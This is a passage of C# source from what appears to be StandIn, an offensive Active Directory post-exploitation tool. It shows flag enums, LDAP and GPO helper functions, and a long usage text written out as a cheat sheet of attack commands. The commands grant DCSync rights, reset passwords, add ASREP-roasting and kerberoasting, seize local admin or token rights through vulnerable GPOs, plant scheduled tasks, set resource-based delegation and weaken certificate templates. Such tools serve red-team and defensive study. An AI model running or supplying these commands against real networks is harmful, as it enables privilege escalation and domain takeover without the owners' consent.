using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;

namespace StandIn
{
	class hStandIn
	{
        [DllImport("ntdll.dll")]
        public static extern void RtlZeroMemory(
            IntPtr Destination,
            int length);

        [StructLayout(LayoutKind.Sequential)]
		public struct SearchObject
		{
			public Boolean success;
			public String sDC;
			public DirectorySearcher searcher;
		}

        [StructLayout(LayoutKind.Sequential)]
        public struct GPOVersion
        {
            public UInt16 iUserVersion;
            public UInt16 iComputerVersion;
        }

        // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a
        [StructLayout(LayoutKind.Sequential)]
        public struct DnssrvRpcRecord
        {
            public UInt16 wDataLength;
            public UInt16 wType;
            public UInt32 dwFlags;
            public UInt32 dwSerial;
            public UInt32 dwTtlSeconds;
            public UInt32 dwTimeStamp;
            public UInt32 dwReserved;
        }

        public enum AccessRequest : UInt32
        {
            none,
            genericall,
            genericwrite,
            resetpassword,
            writemembers,
            dcsync
        }

        [Flags]
        public enum SUPPORTED_ETYPE : Int32
        {
            RC4_HMAC_DEFAULT = 0x0,
            DES_CBC_CRC = 0x1,
            DES_CBC_MD5 = 0x2,
            RC4_HMAC = 0x4,
            AES128_CTS_HMAC_SHA1_96 = 0x08,
            AES256_CTS_HMAC_SHA1_96 = 0x10
        }

        [Flags]
        public enum USER_ACCOUNT_CONTROL : Int32
        {
            SCRIPT = 0x00000001,
            ACCOUNTDISABLE = 0x00000002,
            HOMEDIR_REQUIRED = 0x00000008,
            LOCKOUT = 0x00000010,
            PASSWD_NOTREQD = 0x00000020,
            PASSWD_CANT_CHANGE = 0x00000040,
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000080,
            TEMP_DUPLICATE_ACCOUNT = 0x00000100,
            NORMAL_ACCOUNT = 0x00000200,
            INTERDOMAIN_TRUST_ACCOUNT = 0x00000800,
            WORKSTATION_TRUST_ACCOUNT = 0x00001000,
            SERVER_TRUST_ACCOUNT = 0x00002000,
            UNUSED1 = 0x00004000,
            UNUSED2 = 0x00008000,
            DONT_EXPIRE_PASSWD = 0x00010000,
            MNS_LOGON_ACCOUNT = 0x00020000,
            SMARTCARD_REQUIRED = 0x00040000,
            TRUSTED_FOR_DELEGATION = 0x00080000,
            NOT_DELEGATED = 0x00100000,
            USE_DES_KEY_ONLY = 0x00200000,
            DONT_REQUIRE_PREAUTH = 0x00400000,
            PASSWORD_EXPIRED = 0x00800000,
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x01000000,
            PARTIAL_SECRETS_ACCOUNT = 0x04000000,
            USE_AES_KEYS = 0x08000000
        }

        [Flags]
        public enum SAM_ACCOUNT_TYPE : Int32
        {
            SAM_DOMAIN_OBJECT = 0x0,
            SAM_GROUP_OBJECT = 0x10000000,
            SAM_NON_SECURITY_GROUP_OBJECT = 0x10000001,
            SAM_ALIAS_OBJECT = 0x20000000,
            SAM_NON_SECURITY_ALIAS_OBJECT = 0x20000001,
            SAM_USER_OBJECT = 0x30000000,
            SAM_NORMAL_USER_ACCOUNT = 0x30000000,
            SAM_MACHINE_ACCOUNT = 0x30000001,
            SAM_TRUST_ACCOUNT = 0x30000002,
            SAM_APP_BASIC_GROUP = 0x40000000,
            SAM_APP_QUERY_GROUP = 0x40000001,
            SAM_ACCOUNT_TYPE_MAX = 0x7fffffff
        }

        [Flags]
        public enum msPKICertificateNameFlag : UInt32
        {
            ENROLLEE_SUPPLIES_SUBJECT = 0x00000001,
            ADD_EMAIL = 0x00000002,
            ADD_OBJ_GUID = 0x00000004,
            OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME = 0x00000008,
            ADD_DIRECTORY_PATH = 0x00000100,
            ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 0x00010000,
            SUBJECT_ALT_REQUIRE_DOMAIN_DNS = 0x00400000,
            SUBJECT_ALT_REQUIRE_SPN = 0x00800000,
            SUBJECT_ALT_REQUIRE_DIRECTORY_GUID = 0x01000000,
            SUBJECT_ALT_REQUIRE_UPN = 0x02000000,
            SUBJECT_ALT_REQUIRE_EMAIL = 0x04000000,
            SUBJECT_ALT_REQUIRE_DNS = 0x08000000,
            SUBJECT_REQUIRE_DNS_AS_CN = 0x10000000,
            SUBJECT_REQUIRE_EMAIL = 0x20000000,
            SUBJECT_REQUIRE_COMMON_NAME = 0x40000000,
            SUBJECT_REQUIRE_DIRECTORY_PATH = 0x80000000,
        }

        [Flags]
        public enum msPKIEnrollmentFlag : UInt32
        {
            NONE = 0x00000000,
            INCLUDE_SYMMETRIC_ALGORITHMS = 0x00000001,
            PEND_ALL_REQUESTS = 0x00000002,
            PUBLISH_TO_KRA_CONTAINER = 0x00000004,
            PUBLISH_TO_DS = 0x00000008,
            AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE = 0x00000010,
            AUTO_ENROLLMENT = 0x00000020,
            CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED = 0x80,
            PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT = 0x00000040,
            USER_INTERACTION_REQUIRED = 0x00000100,
            ADD_TEMPLATE_NAME = 0x200,
            REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE = 0x00000400,
            ALLOW_ENROLL_ON_BEHALF_OF = 0x00000800,
            ADD_OCSP_NOCHECK = 0x00001000,
            ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL = 0x00002000,
            NOREVOCATIONINFOINISSUEDCERTS = 0x00004000,
            INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS = 0x00008000,
            ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT = 0x00010000,
            ISSUANCE_POLICIES_FROM_REQUEST = 0x00020000,
            SKIP_AUTO_RENEWAL = 0x00040000
        }

        public static List<String> userTokenRights = new List<String> {
            "SeTrustedCredManAccessPrivilege",
            "SeNetworkLogonRight",
            "SeTcbPrivilege",
            "SeMachineAccountPrivilege",
            "SeIncreaseQuotaPrivilege",
            "SeInteractiveLogonRight",
            "SeRemoteInteractiveLogonRight",
            "SeBackupPrivilege",
            "SeChangeNotifyPrivilege",
            "SeSystemtimePrivilege",
            "SeTimeZonePrivilege",
            "SeCreatePagefilePrivilege",
            "SeCreateTokenPrivilege",
            "SeCreateGlobalPrivilege",
            "SeCreatePermanentPrivilege",
            "SeCreateSymbolicLinkPrivilege",
            "SeDebugPrivilege",
            "SeDenyNetworkLogonRight",
            "SeDenyBatchLogonRight",
            "SeDenyServiceLogonRight",
            "SeDenyInteractiveLogonRight",
            "SeDenyRemoteInteractiveLogonRight",
            "SeEnableDelegationPrivilege",
            "SeRemoteShutdownPrivilege",
            "SeAuditPrivilege",
            "SeImpersonatePrivilege",
            "SeIncreaseWorkingSetPrivilege",
            "SeIncreaseBasePriorityPrivilege",
            "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege",
            "SeBatchLogonRight",
            "SeServiceLogonRight",
            "SeSecurityPrivilege",
            "SeRelabelPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege",
            "SeSystemProfilePrivilege",
            "SeUndockPrivilege",
            "SeAssignPrimaryTokenPrivilege",
            "SeRestorePrivilege",
            "SeShutdownPrivilege",
            "SeSyncAgentPrivilege",
            "SeTakeOwnershipPrivilege"
        };

        public static void getHelp()
		{
			Console.WriteLine(@"  __               ");
			Console.WriteLine(@" ( _/_   _//   ~b33f");
			Console.WriteLine(@"__)/(//)(/(/)  v1.4");
            Console.WriteLine(@"");
            string HelpText = "\n >--~~--> Args? <--~~--<\n\n" +
							  "--help          This help menu\n" +
                              "--object        LDAP filter, e.g. samaccountname=HWest\n" +
                              "--ldap          LDAP filter, can return result collection\n" +
                              "--filter        Filter results, varies based on function\n" +
                              "--limit         Limit results, varies based on function, defaults to 50\n" +
                              "--computer      Machine name, e.g. Celephais-01\n" +
                              "--group         samAccountName, e.g. \"Necronomicon Admins\"\n" +
                              "--ntaccount     User name, e.g. \"REDHOOK\\UPickman\"\n" +
                              "--sid           Dependent on context\n" +
                              "--grant         User name, e.g. \"REDHOOK\\KMason\"\n" +
                              "--guid          Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n" +
                              "--domain        Domain name, e.g. REDHOOK\n" +
							  "--user          User name\n" +
							  "--pass          Password\n" +
                              "--newpass       New password to set for object\n" +
                              "--gpo           List group policy objects\n" +
                              "--acl           Show ACL's for returned GPO's\n" +
                              "--localadmin    Add samAccountName to BUILTIN\\Administrators for vulnerable GPO\n" +
                              "--setuserrights samAccountName for which to add token rights in a vulnerable GPO\n" +
                              "--tasktype      Immediate task type (user/computer)\n" +
                              "--taskname      Immediate task name\n" +
                              "--author        Immediate task author\n" +
                              "--command       Immediate task command\n" +
                              "--args          Immediate task command args\n" +
                              "--target        Optional, filter for DNS name or NTAccount\n" +
                              "--targetsid     Optional, provider user SID\n" +
                              "--increase      Increment either the user or computer GPO version number for the AD object\n" +
                              "--policy        Reads some account/kerberos properties from the \"Default Domain Policy\"\n" +
                              "--dns           Performs ADIDNS enumeration, supports wildcard filters\n" +
                              "--legacy        Boolean, sets DNS seach root to legacy (CN=System)\n" +
                              "--forest        Boolean, sets DNS seach root to forest (DC=ForestDnsZones)\n" +
                              "--passnotreq    Boolean, list accounts that have PASSWD_NOTREQD set\n" +
                              "--type          Rights type: GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync\n" +
                              "--spn           Boolean, list kerberoastable accounts\n" +
                              "--setspn        samAccountName for which to add/remove an SPN\n" +
                              "--principal     Principal name to add to samAccountName (e.g. MSSQL/VermisMysteriis)\n" +
                              "--delegation    Boolean, list accounts with unconstrained / constrained delegation\n" +
                              "--asrep         Boolean, list ASREP roastable accounts\n" +
                              "--dc            Boolean, list all domain controllers\n" +
                              "--trust         Boolean, list all trust relationships\n" +
                              "--site          Boolean, list all sites (related subnets, domains, and servers)\n" +
                              "--adcs          List all CA's and all published templates\n" +
                              "--clientauth    Boolean, modify ADCS template to add/remove \"Client Authentication\"\n" +
                              "--ess           Boolean, modify ADCS template to add/remove \"ENROLLEE_SUPPLIES_SUBJECT\"\n" +
                              "--pend          Boolean, modify ADCS template to add/remove \"PEND_ALL_REQUESTS\"\n" +
                              "--owner         Boolean, modify ADCS template owner\n" +
                              "--write         Boolean, modify ADCS template, add/remove WriteDacl/WriteOwner/WriteProperty permission for NtAccount\n" +
                              "--enroll        Boolean, modify ADCS template, add/remove \"Certificate-Enrollment\" permission for NtAccount\n" +
                              "--add           Boolean, context dependent group/spn/adcs\n" +
                              "--remove        Boolean, context dependent msDS-AllowedToActOnBehalfOfOtherIdentity/group/adcs\n" +
							  "--make          Boolean, make machine; ms-DS-MachineAccountQuota applies\n" +
							  "--disable       Boolean, disable machine; should be the same user that created the machine\n" +
                              "--access        Boolean, list access permissions for object\n" +
                              "--delete        Boolean, delete machine from AD; requires elevated AD access\n\n" +
							  " >--~~--> Usage? <--~~--<\n\n" +
                              "# Perform LDAP search\n" +
                              "StandIn.exe --ldap \"(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\"\n" +
                              "StandIn.exe --ldap servicePrincipalName=* --domain redhook --user RFludd --pass Cl4vi$Alchemi4e --limit 10\n" +
                              "StandIn.exe --ldap servicePrincipalName=* --filter \"pwdlastset, distinguishedname, lastlogon\" --limit 100\n\n" +

                              "# Query object properties by LDAP filter\n" +
                              "StandIn.exe --object \"(&(samAccountType=805306368)(servicePrincipalName=*vermismysteriis.redhook.local*))\"\n" +
                              "StandIn.exe --object samaccountname=Celephais-01$ --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n" +
                              "StandIn.exe --object samaccountname=Celephais-01$ --filter \"pwdlastset, serviceprincipalname, objectsid\"\n\n" +

                              "# Query object access permissions, optionally filter by NTAccount\n" +
                              "StandIn.exe --object \"distinguishedname=DC=redhook,DC=local\" --access\n" +
                              "StandIn.exe --object samaccountname=Rllyeh$ --access --ntaccount \"REDHOOK\\EDerby\"\n" +
                              "StandIn.exe --object samaccountname=JCurwen --access --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Grant object access permissions\n" +
                              "StandIn.exe --object \"distinguishedname=DC=redhook,DC=local\" --grant \"REDHOOK\\MBWillett\" --type DCSync\n" +
                              "StandIn.exe --object \"distinguishedname=DC=redhook,DC=local\" --grant \"REDHOOK\\MBWillett\" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n" +
                              "StandIn.exe --object samaccountname=SomeTarget001$ --grant \"REDHOOK\\MBWillett\" --type GenericWrite --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Set object password\n" +
                              "StandIn.exe --object samaccountname=SomeTarget001$ --newpass \"Arkh4mW1tch!\"\n" +
                              "StandIn.exe --object samaccountname=BJenkin --newpass \"Dr34m1nTh3H#u$e\" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add ASREP to userAccountControl flags\n" +
                              "StandIn.exe --object samaccountname=HArmitage --asrep\n" +
                              "StandIn.exe --object samaccountname=FMorgan --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Remove ASREP from userAccountControl flags\n" +
                              "StandIn.exe --object samaccountname=TMalone --asrep --remove\n" +
                              "StandIn.exe --object samaccountname=RSuydam --asrep  --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Get a list of all ASREP roastable accounts\n" +
                              "StandIn.exe --asrep\n" +
                              "StandIn.exe --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Return GPO objects, optionally wildcard filter and get ACL's\n" +
                              "StandIn.exe --gpo --limit 20\n" +
                              "StandIn.exe --gpo --filter admin --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n" +
                              "StandIn.exe --gpo --filter admin --acl --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add samAccountName to BUILTIN\\Administrators for vulnerable GPO\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add token rights to samAccountName in a vulnerable GPO\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant \"SeTcbPrivilege,SeDebugPrivilege\"\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant SeLoadDriverPrivilege --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add user/computer immediate task and optionally filter\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author \"REDHOOK\\JCurwen\" --command \"C:\\Windows\\System32\\notepad.exe\" --args \"C:\\Mysteriis\\CultesDesGoules.txt\"\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author \"REDHOOK\\JCurwen\" --command \"C:\\Windows\\System32\\notepad.exe\" --args \"C:\\Mysteriis\\CultesDesGoules.txt\" --target Rllyeh.redhook.local\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype user --author \"REDHOOK\\JCurwen\" --command \"C:\\Windows\\System32\\notepad.exe\" --args \"C:\\Mysteriis\\CultesDesGoules.txt\" --target \"REDHOOK\\RBloch\" --targetsid S-1-5-21-315358687-3711474269-2098994107-1106\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author \"REDHOOK\\JCurwen\" --command \"C:\\Windows\\System32\\notepad.exe\" --args \"C:\\Mysteriis\\CultesDesGoules.txt\" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Increment either the user or computer GPO version number for the AD object\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype user\n" +
                              "StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype computer --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Read Default Domain Policy\n" +
                              "StandIn.exe --policy\n" +
                              "StandIn.exe --policy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Perform ADIDNS searches\n" +
                              "StandIn.exe --dns --limit 20\n" +
                              "StandIn.exe --dns --filter SQL --limit 10\n" +
                              "StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n" +
                              "StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# List account that have PASSWD_NOTREQD set\n" +
                              "StandIn.exe --passnotreq\n" +
                              "StandIn.exe --passnotreq --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Get user and SID from either a SID or a samAccountName\n" +
                              "StandIn.exe --sid JCurwen\n" +
                              "StandIn.exe --sid S-1-5-21-315358687-3711474269-2098994107-1105 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Get a list of all kerberoastable accounts\n" +
                              "StandIn.exe --spn\n" +
                              "StandIn.exe --spn --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add/remove SPN from samAccountName\n" +
                              "StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --add\n" +
                              "StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# List all accounts with unconstrained & constrained delegation privileges\n" +
                              "StandIn.exe --delegation\n" +
                              "StandIn.exe --delegation --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Get a list of all domain controllers\n" +
                              "StandIn.exe --dc\n\n" +

                              "# Get a list of all trust relationships in the current domain\n" +
                              "StandIn.exe --trust\n\n" +

                              "# Get a list of all the sites and the related subnets\n" +
                              "StandIn.exe --site\n\n" +

                              "# List members of group or list user group membership\n" +
                              "StandIn.exe --group Literarum\n" +
                              "StandIn.exe --group \"Magna Ultima\" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n" +
                              "StandIn.exe --group JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add user to group\n" +
                              "StandIn.exe --group \"Dunwich Council\" --ntaccount \"REDHOOK\\WWhateley\" --add\n" +
                              "StandIn.exe --group DAgon --ntaccount \"REDHOOK\\RCarter\" --add --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Remove user from group\n" +
                              "StandIn.exe --group \"Dunwich Council\" --ntaccount \"REDHOOK\\WWhateley\" --remove\n" +
                              "StandIn.exe --group DAgon --ntaccount \"REDHOOK\\RCarter\" --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# List CA's and all published templates, optionally wildcard filter on template name\n" +
                              "StandIn.exe --adcs\n" +
                              "StandIn.exe --adcs --filter Kingsport\n" +
                              "StandIn.exe --adcs --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add/remove \"Client Authentication\" from template pKIExtendedKeyUsage, filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --clientauth --add\n" +
                              "StandIn.exe --adcs --filter Kingsport --clientauth --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add/remove \"ENROLLEE_SUPPLIES_SUBJECT\" from template msPKI-Certificate-Name-Flag, filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --ess --add\n" +
                              "StandIn.exe --adcs --filter Kingsport --ess --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Add/remove \"PEND_ALL_REQUESTS\" from template msPKI-Enrollment-Flag, filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --pend --add\n" +
                              "StandIn.exe --adcs --filter Kingsport --pend --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Change template owner, filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --owner\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --owner --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Grant NtAccount WriteDacl/WriteOwner/WriteProperty, filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --write --add\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --write --remove  --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Grant NtAccount \"Certificate-Enrollment\", filter should contain the exact name of the template\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --enroll --add\n" +
                              "StandIn.exe --adcs --filter Kingsport --ntaccount \"REDHOOK\\MBWillett\" --enroll --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

                              "# Create machine object\n" +
                              "StandIn.exe --computer Innsmouth --make\n" +
                              "StandIn.exe --computer Innsmouth --make --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

							  "# Disable machine object\n" +
                              "StandIn.exe --computer Arkham --disable\n" +
                              "StandIn.exe --computer Arkham --disable --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

							  "# Delete machine object\n" +
                              "StandIn.exe --computer Danvers --delete\n" +
                              "StandIn.exe --computer Danvers --delete --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

							  "# Add msDS-AllowedToActOnBehalfOfOtherIdentity to machine object properties\n" +
                              "StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543\n" +
                              "StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n\n" +

							  "# Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties\n" +
                              "StandIn.exe --computer Miskatonic --remove\n" +
                              "StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e";
			Console.WriteLine(HelpText);
		}

        public static void printColor(String sText, ConsoleColor eColor)
        {
            Console.ForegroundColor = eColor;
            Console.WriteLine(sText);
            Console.ResetColor();
        }

		public static String genAccountPass()
		{
			String sKeyspace = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			Char[] sPass = new Char[15];
			Random rand = new Random();
			for (int i = 0; i < sPass.Length; i++)
			{
				sPass[i] = sKeyspace[rand.Next(sKeyspace.Length)];
			}

			return new string(sPass);
		}

        public static SearchObject createSearchObject(String sDomain = "", String sUser = "", String sPass = "", Boolean ActOnBehalf = false)
        {
            DirectoryEntry de = null;
            DirectorySearcher ds = null;
            SearchObject resultObject = new SearchObject();
            try
            {
                de = new DirectoryEntry();
                resultObject.sDC = de.Options.GetCurrentServerName();
                Console.WriteLine("\n[?] Using DC : " + de.Options.GetCurrentServerName());
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    de.Username = sUserDomain;
                    de.Password = sPass;
                }

                ds = new DirectorySearcher(de);
                if (ActOnBehalf)
                {
                    ds.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity");
                }
                ds.PageSize = 1000;

                resultObject.success = true;
                resultObject.searcher = ds;
            }
            catch
            {
                resultObject.success = false;
            }

            return resultObject;
        }

        public static String rightsGUIDToFriendlyName(Guid rightsGuid, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry extendedRightsRoot = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                    extendedRightsRoot = new DirectoryEntry("LDAP://" + rootdse.Properties["configurationNamingContext"].Value.ToString(), sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                    extendedRightsRoot = new DirectoryEntry("LDAP://CN=Extended-Rights," + rootdse.Properties["configurationNamingContext"].Value.ToString());
                }

                // Search
                DirectorySearcher ds = new DirectorySearcher(extendedRightsRoot);
                ds.SearchScope = System.DirectoryServices.SearchScope.OneLevel;
                ds.PropertiesToLoad.Add("cn");
                ds.Filter = $"(rightsGuid={rightsGuid.ToString("D")})";
                SearchResult sr = ds.FindOne();

                if (sr != null)
                {
                    return sr.Properties["cn"][0].ToString();
                }
                else
                {
                    return String.Empty;
                }
            }
            catch
            {
                return String.Empty;
            }
        }

        public static String schemaGUIDToFriendlyName(Guid schemaIDGuid, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry schemaRoot = null;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                    schemaRoot = new DirectoryEntry("LDAP://" + rootdse.Properties["schemaNamingContext"].Value.ToString(), sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                    schemaRoot = new DirectoryEntry("LDAP://" + rootdse.Properties["schemaNamingContext"].Value.ToString());
                }

                // Search
                DirectorySearcher ds = new DirectorySearcher(schemaRoot);
                ds.SearchScope = System.DirectoryServices.SearchScope.OneLevel;
                ds.PropertiesToLoad.Add("ldapDisplayName");
                ds.Filter = $"(schemaIDGUID={hStandIn.BuildFilterOctetString(schemaIDGuid.ToByteArray())})";
                SearchResult sr = ds.FindOne();

                if (sr != null)
                {
                    return sr.Properties["ldapDisplayName"][0].ToString();
                }
                else
                {
                    return String.Empty;
                }
            }
            catch
            {
                return String.Empty;
            }
        }

        public static String BuildFilterOctetString(byte[] bytes)
		{
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < bytes.Length; i++)
			{
				sb.AppendFormat("\\{0}", bytes[i].ToString("X2"));
			}
			return sb.ToString();
		}

        public static GPOVersion UInt32ToGPOVersion(UInt32 iGPOVersion)
        {
            IntPtr pGPO = Marshal.AllocHGlobal(4);
            RtlZeroMemory(pGPO, 4);
            Marshal.WriteInt32(pGPO, (Int32)iGPOVersion);

            GPOVersion gv = new GPOVersion();
            gv.iComputerVersion = (UInt16)Marshal.ReadInt16(pGPO);
            gv.iUserVersion = (UInt16)Marshal.ReadInt16((IntPtr)(pGPO.ToInt64() + 2));

            Marshal.FreeHGlobal(pGPO);

            return gv;
        }

        public static UInt32 GPOVersionToUInt32(GPOVersion oGPOVersion)
        {
            IntPtr pGPO = Marshal.AllocHGlobal(4);
            RtlZeroMemory(pGPO, 4);
            Marshal.WriteInt16(pGPO, (Int16)oGPOVersion.iComputerVersion);
            Marshal.WriteInt16((IntPtr)(pGPO.ToInt64() + 2), (Int16)oGPOVersion.iUserVersion);

            UInt32 iResVal = (UInt32)Marshal.ReadInt32(pGPO);
            Marshal.FreeHGlobal(pGPO);

            return iResVal;
        }

        public static UInt32 IncrementGPOVersion(GPOVersion oGPOVersion, Boolean bUser, Boolean bComputer)
        {
            if (bUser)
            {
                if (oGPOVersion.iUserVersion == 0xffff) {
                    oGPOVersion.iUserVersion = 1;
                } else
                {
                    oGPOVersion.iUserVersion += 1;
                }
            }

            if (bComputer)
            {
                if (oGPOVersion.iComputerVersion == 0xffff) {
                    oGPOVersion.iComputerVersion = 1;
                }
                else
                {
                    oGPOVersion.iComputerVersion += 1;
                }
            }

            return GPOVersionToUInt32(oGPOVersion);
        }

        public static Int16 getInt16ToBigEndian(Int16 iInput)
        {
            byte[] aBytes = BitConverter.GetBytes(iInput);
            Array.Reverse(aBytes);
            return BitConverter.ToInt16(aBytes, 0);
        }

        public static Int32 getInt32ToBigEndian(Int32 iInput)
        {
            byte[] aBytes = BitConverter.GetBytes(iInput);
            Array.Reverse(aBytes);
            return BitConverter.ToInt32(aBytes, 0);
        }

        public static void ReadDNSObject(Byte[] arrObj)
        {
            try
            {
                IntPtr pObject = Marshal.AllocHGlobal(arrObj.Length);
                Marshal.Copy(arrObj, 0, pObject, arrObj.Length);

                DnssrvRpcRecord oRecord = (DnssrvRpcRecord)Marshal.PtrToStructure(pObject, typeof(DnssrvRpcRecord));
                IntPtr pData = (IntPtr)(pObject.ToInt64() + 24);

                if (oRecord.wType == 0)
                {
                    Int64 iMSTS = (Marshal.ReadInt64(pData)/10)/1000;
                    Console.WriteLine("    |_ DNS_RPC_RECORD_TS : " + (new DateTime(1601, 1, 1)).AddMilliseconds(iMSTS));
                }
                else if (oRecord.wType == 1)
                {
                    byte[] bytes = BitConverter.GetBytes(Marshal.ReadInt32(pData));
                    Console.WriteLine("    |_ DNS_RPC_RECORD_A : " + new IPAddress(bytes).ToString());
                }
                else if (oRecord.wType == 2 || oRecord.wType == 5 || oRecord.wType == 12)
                {
                    Int16 iLen = Marshal.ReadByte(pData);
                    Int16 iSeg = Marshal.ReadByte((IntPtr)(pData.ToInt64() + 1));
